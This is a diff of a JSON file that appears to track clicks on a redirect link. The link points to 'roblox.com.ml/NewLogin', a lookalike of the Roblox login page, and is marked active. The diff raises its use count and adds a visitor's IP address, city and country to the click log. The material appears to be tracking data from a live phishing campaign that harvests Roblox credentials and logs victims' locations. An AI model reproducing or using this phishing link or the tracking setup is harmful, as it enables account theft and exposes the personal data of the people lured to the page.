@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 138,
+    "useCount": 139,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1214,6 +1214,14 @@
         "ip": "103.167.116.92",
         "country": "Philippines",
         "city": "Caloocan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776950009370,
+        "ip": "49.146.59.214",
+        "country": "Philippines",
+        "city": "Koronadal",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
